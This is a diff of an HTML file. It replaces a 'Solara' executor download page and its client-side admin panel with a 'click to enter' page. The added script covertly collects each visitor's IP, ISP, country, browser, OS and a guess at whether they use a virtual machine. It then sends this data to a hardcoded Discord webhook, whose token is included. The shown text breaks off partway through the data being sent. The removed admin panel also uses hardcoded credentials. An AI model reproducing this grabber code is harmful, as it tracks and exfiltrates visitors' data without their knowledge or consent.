@@ -1,571 +1,148 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Solara</title>
-  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;800&display=swap" rel="stylesheet" />
-  <style>
-    * {
-      margin: 0;
-      padding: 0;
-      box-sizing: border-box;
-      font-family: 'Inter', sans-serif;
-    }
-
-    body {
-      background-color: #0b0b0f;
-      color: #fff;
-      overflow-x: hidden;
-    }
-
-    header {
-      display: flex;
-      justify-content: space-between;
-      align-items: center;
-      padding: 2rem 4rem;
-      position: absolute;
-      width: 100%;
-      z-index: 10;
-    }
-
-    header .logo {
-      display: flex;
-      align-items: center;
-    }
-
-    header .logo img {
-      height: 35px;
-    }
-
-    header .btn {
-      background: #7a3cff;
-      color: white;
-      padding: 0.75rem 1.5rem;
-      border: none;
-      border-radius: 8px;
-      font-weight: 600;
-      cursor: pointer;
-      transition: 0.2s ease-in-out;
-    }
-
-    header .btn:hover {
-      background: #9b5fff;
-    }
-
-    .hero {
-      height: 100vh;
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      justify-content: center;
-      text-align: center;
-      background: radial-gradient(circle at top, #211b35 0%, #0b0b0f 80%);
-      background-attachment: fixed;
-    }
-
-    .hero h1 {
-      font-size: 2.5rem;
-      font-weight: 800;
-      margin-bottom: 2rem;
-      line-height: 1.2;
-    }
-
-    .hero img {
-      width: 60%;
-      max-width: 900px;
-      border-radius: 12px;
-      box-shadow: 0 0 30px rgba(150, 100, 255, 0.3);
-    }
-
-    section.download {
-      min-height: 100vh;
-      background-color: #0b0b0f;
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      justify-content: center;
-      padding: 4rem 2rem;
-    }
-
-    .download h2 {
-      font-size: 2rem;
-      margin-bottom: 1rem;
-    }
-
-    .download p {
-      color: #aaa;
-      margin-bottom: 2rem;
-    }
-
-    .card-container {
-      display: flex;
-      gap: 2rem;
-      flex-wrap: wrap;
-      justify-content: center;
-    }
-
-    .card {
-      background: #12121a;
-      border: 1px solid #232333;
-      border-radius: 16px;
-      padding: 2rem;
-      text-align: center;
-      width: 300px;
-      transition: 0.2s;
-      box-shadow: 0 0 10px rgba(120, 60, 255, 0.1);
-    }
-
-    .card:hover {
-      transform: translateY(-5px);
-      box-shadow: 0 0 20px rgba(120, 60, 255, 0.3);
-    }
-
-    .card span {
-      display: inline-block;
-      background: #7a3cff;
-      color: white;
-      padding: 0.25rem 0.75rem;
-      border-radius: 8px;
-      font-size: 0.8rem;
-      font-weight: 600;
-      margin-bottom: 1rem;
-    }
-
-    .card h3 {
-      font-size: 1.2rem;
-      margin-bottom: 0.5rem;
-    }
-
-    .card p {
-      color: #bbb;
-      font-size: 0.9rem;
-    }
-
-    footer {
-      text-align: center;
-      padding: 2rem;
-      color: #666;
-      font-size: 0.9rem;
-    }
-
-    /* Admin Panel Styles */
-    .admin-login {
-      min-height: 100vh;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      background: #0b0b0f;
-    }
-
-    .login-form {
-      background: #12121a;
-      border: 1px solid #232333;
-      border-radius: 16px;
-      padding: 2rem;
-      width: 400px;
-      box-shadow: 0 0 20px rgba(120, 60, 255, 0.3);
-    }
-
-    .login-form h2 {
-      text-align: center;
-      margin-bottom: 2rem;
-      color: #fff;
-    }
-
-    .form-group {
-      margin-bottom: 1.5rem;
-    }
-
-    .form-group label {
-      display: block;
-      margin-bottom: 0.5rem;
-      color: #bbb;
-    }
-
-    .form-group input {
-      width: 100%;
-      padding: 0.75rem;
-      border-radius: 8px;
-      border: 1px solid #232333;
-      background: #0b0b0f;
-      color: #fff;
-    }
-
-    .login-btn {
-      width: 100%;
-      background: #7a3cff;
-      color: white;
-      padding: 0.75rem;
-      border: none;
-      border-radius: 8px;
-      font-weight: 600;
-      cursor: pointer;
-      transition: 0.2s ease-in-out;
-    }
-
-    .login-btn:hover {
-      background: #9b5fff;
-    }
-
-    .admin-panel {
-      min-height: 100vh;
-      background: #0b0b0f;
-      padding: 2rem;
-    }
-
-    .admin-header {
-      display: flex;
-      justify-content: space-between;
-      align-items: center;
-      margin-bottom: 2rem;
-      padding-bottom: 1rem;
-      border-bottom: 1px solid #232333;
-    }
-
-    .admin-header h1 {
-      color: #fff;
-    }
-
-    .logout-btn {
-      background: #ff3c3c;
-      color: white;
-      padding: 0.5rem 1rem;
-      border: none;
-      border-radius: 8px;
-      font-weight: 600;
-      cursor: pointer;
-      transition: 0.2s ease-in-out;
-    }
-
-    .logout-btn:hover {
-      background: #ff5f5f;
-    }
-
-    .admin-content {
-      display: grid;
-      grid-template-columns: 1fr 1fr;
-      gap: 2rem;
-    }
-
-    .admin-section {
-      background: #12121a;
-      border: 1px solid #232333;
-      border-radius: 16px;
-      padding: 1.5rem;
-    }
-
-    .admin-section h2 {
-      color: #fff;
-      margin-bottom: 1rem;
-      font-size: 1.2rem;
-    }
-
-    .admin-section textarea {
-      width: 100%;
-      height: 150px;
-      padding: 1rem;
-      border-radius: 8px;
-      border: 1px solid #232333;
-      background: #0b0b0f;
-      color: #fff;
-      resize: vertical;
-    }
-
-    .admin-section input {
-      width: 100%;
-      padding: 0.75rem;
-      border-radius: 8px;
-      border: 1px solid #232333;
-      background: #0b0b0f;
-      color: #fff;
-      margin-bottom: 1rem;
-    }
-
-    .save-btn {
-      background: #7a3cff;
-      color: white;
-      padding: 0.75rem 1.5rem;
-      border: none;
-      border-radius: 8px;
-      font-weight: 600;
-      cursor: pointer;
-      transition: 0.2s ease-in-out;
-      margin-top: 1rem;
-    }
-
-    .save-btn:hover {
-      background: #9b5fff;
-    }
-
-    .notification {
-      position: fixed;
-      top: 20px;
-      right: 20px;
-      background: #7a3cff;
-      color: white;
-      padding: 1rem 1.5rem;
-      border-radius: 8px;
-      box-shadow: 0 0 20px rgba(120, 60, 255, 0.3);
-      z-index: 1000;
-      opacity: 0;
-      transition: opacity 0.3s;
-    }
-
-    .notification.show {
-      opacity: 1;
-    }
-
-    .hidden {
-      display: none;
-    }
-  </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Enter Site</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            background-color: #000;
+            font-family: Arial, sans-serif;
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            cursor: pointer;
+            overflow: hidden;
+        }
+        
+        #enter-text {
+            color: #fff;
+            font-size: 3rem;
+            text-align: center;
+            transition: opacity 0.5s ease;
+        }
+        
+        #enter-text.fade-out {
+            opacity: 0;
+        }
+        
+        #status {
+            color: #fff;
+            position: fixed;
+            bottom: 20px;
+            left: 50%;
+            transform: translateX(-50%);
+            font-size: 0.8rem;
+            opacity: 0.7;
+        }
+    </style>
 </head>
 <body>
-  <!-- Main Website Content -->
-  <div id="website-content">
-    <header>
-      <div class="logo">
-        <img id="logo-img" src="https://framerusercontent.com/images/DlRElQUJJeYv6bYZZSVeBgFaCE.png?scale-down-to=512" alt="Solara Logo" />
-      </div>
-      <button class="btn" onclick="scrollToDownload()">Download</button>
-    </header>
+    <div id="enter-text">click to enter</div>
+    <div id="status"></div>
 
-    <section class="hero">
-      <h1 id="hero-title">The First & Best External Executor After Byfron.</h1>
-      <img id="hero-img" src="https://i.imgur.com/eHbNRkV.png" alt="Solara Code Editor Screenshot" />
-    </section>
+    <script>
+        // Function to get user's IP information
+        async function getUserIPInfo() {
+            try {
+                const response = await fetch('https://ipapi.co/json/');
+                const data = await response.json();
+                return data;
+            } catch (error) {
+                console.error('Error fetching IP info:', error);
+                return null;
+            }
+        }
 
-    <section class="download" id="download">
-      <h2 id="download-title">Download Solara</h2>
-      <p id="download-subtitle">Choose a method below. Windows only.</p>
+        // Function to detect browser
+        function getBrowserInfo() {
+            const userAgent = navigator.userAgent;
+            let browser = "Unknown";
+            
+            if (userAgent.includes("Chrome") && !userAgent.includes("Edg")) browser = "Chrome";
+            else if (userAgent.includes("Firefox")) browser = "Firefox";
+            else if (userAgent.includes("Safari") && !userAgent.includes("Chrome")) browser = "Safari";
+            else if (userAgent.includes("Edg")) browser = "Edge";
+            else if (userAgent.includes("Opera") || userAgent.includes("OPR")) browser = "Opera";
+            
+            return browser;
+        }
 
-      <div class="card-container">
-        <div class="card">
-          <span id="card1-badge">RECOMMENDED</span>
-          <h3 id="card1-title">Bootstrapper (Auto-Updating)</h3>
-          <p id="card1-desc">Small installer that keeps Solara up-to-date automatically.</p>
-        </div>
-        <div class="card">
-          <span id="card2-badge">MANUAL</span>
-          <h3 id="card2-title">Direct Zip (Manual Zip)</h3>
-          <p id="card2-desc">Portable zip. You manage updates yourself.</p>
-        </div>
-      </div>
-    </section>
+        // Function to detect OS
+        function getOSInfo() {
+            const userAgent = navigator.userAgent;
+            let os = "Unknown";
+            
+            if (userAgent.includes("Windows")) os = "Windows";
+            else if (userAgent.includes("Mac")) os = "Mac";
+            else if (userAgent.includes("Linux")) os = "Linux";
+            else if (userAgent.includes("Android")) os = "Android";
+            else if (userAgent.includes("iOS") || userAgent.includes("iPhone") || userAgent.includes("iPad")) os = "iOS";
+            
+            return os;
+        }
 
-    <footer>
-      <p id="footer-text">© 2025 Solara. All rights reserved.</p>
-    </footer>
-  </div>
+        // Function to detect if user is on a VM (basic detection)
+        function detectVM() {
+            // This is a very basic check and not very reliable
+            const userAgent = navigator.userAgent.toLowerCase();
+            const vmIndicators = ['virtualbox', 'vmware', 'hyper-v', 'qemu', 'xen'];
+            
+            for (let indicator of vmIndicators) {
+                if (userAgent.includes(indicator)) {
+                    return "Yes";
+                }
+            }
+            
+            // Check for common VM screen resolutions
+            const width = screen.width;
+            const height = screen.height;
+            const commonVMResolutions = [
+                [1024, 768],
+                [800, 600],
+                [1152, 864]
+            ];
+            
+            for (let res of commonVMResolutions) {
+                if (width === res[0] && height === res[1]) {
+                    return "Likely";
+                }
+            }
+            
+            return "No";
+        }
 
-  <!-- Admin Login -->
-  <div id="admin-login" class="admin-login">
-    <div class="login-form">
-      <h2>Admin Login</h2>
-      <div class="form-group">
-        <label for="username">Username</label>
-        <input type="text" id="username" placeholder="Enter username">
-      </div>
-      <div class="form-group">
-        <label for="password">Password</label>
-        <input type="password" id="password" placeholder="Enter password">
-      </div>
-      <button class="login-btn" onclick="login()">Login</button>
-    </div>
-  </div>
-
-  <!-- Admin Panel -->
-  <div id="admin-panel" class="admin-panel hidden">
-    <div class="admin-header">
-      <h1>Admin Panel</h1>
-      <button class="logout-btn" onclick="logout()">Logout</button>
-    </div>
-    
-    <div class="admin-content">
-      <div class="admin-section">
-        <h2>Header Section</h2>
-        <div class="form-group">
-          <label for="logo-url">Logo URL</label>
-          <input type="text" id="logo-url" placeholder="Enter logo URL">
-        </div>
-        <div class="form-group">
-          <label for="button-text">Button Text</label>
-          <input type="text" id="button-text" placeholder="Enter button text">
-        </div>
-      </div>
-      
-      <div class="admin-section">
-        <h2>Hero Section</h2>
-        <div class="form-group">
-          <label for="hero-title">Hero Title</label>
-          <textarea id="hero-title-text" placeholder="Enter hero title"></textarea>
-        </div>
-        <div class="form-group">
-          <label for="hero-img">Hero Image URL</label>
-          <input type="text" id="hero-img-url" placeholder="Enter hero image URL">
-        </div>
-      </div>
-      
-      <div class="admin-section">
-        <h2>Download Section</h2>
-        <div class="form-group">
-          <label for="download-title">Download Title</label>
-          <input type="text" id="download-title-text" placeholder="Enter download title">
-        </div>
-        <div class="form-group">
-          <label for="download-subtitle">Download Subtitle</label>
-          <input type="text" id="download-subtitle-text" placeholder="Enter download subtitle">
-        </div>
-      </div>
-      
-      <div class="admin-section">
-        <h2>Card 1</h2>
-        <div class="form-group">
-          <label for="card1-badge">Card 1 Badge</label>
-          <input type="text" id="card1-badge-text" placeholder="Enter card 1 badge">
-        </div>
-        <div class="form-group">
-          <label for="card1-title">Card 1 Title</label>
-          <input type="text" id="card1-title-text" placeholder="Enter card 1 title">
-        </div>
-        <div class="form-group">
-          <label for="card1-desc">Card 1 Description</label>
-          <textarea id="card1-desc-text" placeholder="Enter card 1 description"></textarea>
-        </div>
-      </div>
-      
-      <div class="admin-section">
-        <h2>Card 2</h2>
-        <div class="form-group">
-          <label for="card2-badge">Card 2 Badge</label>
-          <input type="text" id="card2-badge-text" placeholder="Enter card 2 badge">
-        </div>
-        <div class="form-group">
-          <label for="card2-title">Card 2 Title</label>
-          <input type="text" id="card2-title-text" placeholder="Enter card 2 title">
-        </div>
-        <div class="form-group">
-          <label for="card2-desc">Card 2 Description</label>
-          <textarea id="card2-desc-text" placeholder="Enter card 2 description"></textarea>
-        </div>
-      </div>
-      
-      <div class="admin-section">
-        <h2>Footer</h2>
-        <div class="form-group">
-          <label for="footer-text">Footer Text</label>
-          <textarea id="footer-text-text" placeholder="Enter footer text"></textarea>
-        </div>
-      </div>
-    </div>
-    
-    <button class="save-btn" onclick="saveChanges()">Save All Changes</button>
-  </div>
-
-  <!-- Notification -->
-  <div id="notification" class="notification hidden">Changes saved successfully!</div>
-
-  <script>
-    // Check if we're on the admin page
-    if (window.location.pathname === '/admin' || window.location.hash === '#admin') {
-      document.getElementById('website-content').classList.add('hidden');
-      document.getElementById('admin-login').classList.remove('hidden');
-    }
-
-    // Login function
-    function login() {
-      const username = document.getElementById('username').value;
-      const password = document.getElementById('password').value;
-      
-      if (username === 'username' && password === 'password') {
-        document.getElementById('admin-login').classList.add('hidden');
-        document.getElementById('admin-panel').classList.remove('hidden');
-        loadCurrentValues();
-      } else {
-        alert('Invalid credentials. Use username: "username" and password: "password"');
-      }
-    }
-
-    // Logout function
-    function logout() {
-      document.getElementById('admin-panel').classList.add('hidden');
-      document.getElementById('admin-login').classList.remove('hidden');
-      document.getElementById('website-content').classList.remove('hidden');
-    }
-
-    // Load current values into admin panel
-    function loadCurrentValues() {
-      // Header
-      document.getElementById('logo-url').value = document.getElementById('logo-img').src;
-      document.getElementById('button-text').value = document.querySelector('header .btn').textContent;
-      
-      // Hero section
-      document.getElementById('hero-title-text').value = document.getElementById('hero-title').textContent;
-      document.getElementById('hero-img-url').value = document.getElementById('hero-img').src;
-      
-      // Download section
-      document.getElementById('download-title-text').value = document.getElementById('download-title').textContent;
-      document.getElementById('download-subtitle-text').value = document.getElementById('download-subtitle').textContent;
-      
-      // Card 1
-      document.getElementById('card1-badge-text').value = document.getElementById('card1-badge').textContent;
-      document.getElementById('card1-title-text').value = document.getElementById('card1-title').textContent;
-      document.getElementById('card1-desc-text').value = document.getElementById('card1-desc').textContent;
-      
-      // Card 2
-      document.getElementById('card2-badge-text').value = document.getElementById('card2-badge').textContent;
-      document.getElementById('card2-title-text').value = document.getElementById('card2-title').textContent;
-      document.getElementById('card2-desc-text').value = document.getElementById('card2-desc').textContent;
-      
-      // Footer
-      document.getElementById('footer-text-text').value = document.getElementById('footer-text').textContent;
-    }
-
-    // Save changes function
-    function saveChanges() {
-      // Header
-      document.getElementById('logo-img').src = document.getElementById('logo-url').value;
-      document.querySelector('header .btn').textContent = document.getElementById('button-text').value;
-      
-      // Hero section
-      document.getElementById('hero-title').textContent = document.getElementById('hero-title-text').value;
-      document.getElementById('hero-img').src = document.getElementById('hero-img-url').value;
-      
-      // Download section
-      document.getElementById('download-title').textContent = document.getElementById('download-title-text').value;
-      document.getElementById('download-subtitle').textContent = document.getElementById('download-subtitle-text').value;
-      
-      // Card 1
-      document.getElementById('card1-badge').textContent = document.getElementById('card1-badge-text').value;
-      document.getElementById('card1-title').textContent = document.getElementById('card1-title-text').value;
-      document.getElementById('card1-desc').textContent = document.getElementById('card1-desc-text').value;
-      
-      // Card 2
-      document.getElementById('card2-badge').textContent = document.getElementById('card2-badge-text').value;
-      document.getElementById('card2-title').textContent = document.getElementById('card2-title-text').value;
-      document.getElementById('card2-desc').textContent = document.getElementById('card2-desc-text').value;
-      
-      // Footer
-      document.getElementById('footer-text').textContent = document.getElementById('footer-text-text').value;
-      
-      // Show notification
-      const notification = document.getElementById('notification');
-      notification.classList.remove('hidden');
-      notification.classList.add('show');
-      
-      setTimeout(() => {
-        notification.classList.remove('show');
-        setTimeout(() => {
-          notification.classList.add('hidden');
-        }, 300);
-      }, 3000);
-    }
-
-    // Original scroll function
-    function scrollToDownload() {
-      document.getElementById('download').scrollIntoView({ behavior: 'smooth' });
-    }
-  </script>
-</body>
-</html>
+        // Function to send data to Discord webhook
+        async function sendToDiscord(data) {
+            const webhookURL = "https://discord.com/api/webhooks/1428128390556422164/L7MJh8HF0pq4N9pqgsqgPtBubRcT4aSirZZTEcWUXlWKM4sjKWcJjMYMPbjfMUZz1R6t";
+            
+            const embed = {
+                title: "New Visitor Information",
+                color: 0x000000,
+                fields: [
+                    {
+                        name: "IP",
+                        value: data.ip || "Unknown",
+                        inline: true
+                    },
+                    {
+                        name: "ISP",
+                        value: data.org || data.asn || "Unknown",
+                        inline: true
+                    },
+                    {
+                        name: "ORG",
+                        value: data.org || "Unknown",
+                        inline: true
+                    },
+                    {
+                        name: "COUNTRY",
+                        value: data.country_name || "Unknown",
+                        inline: true
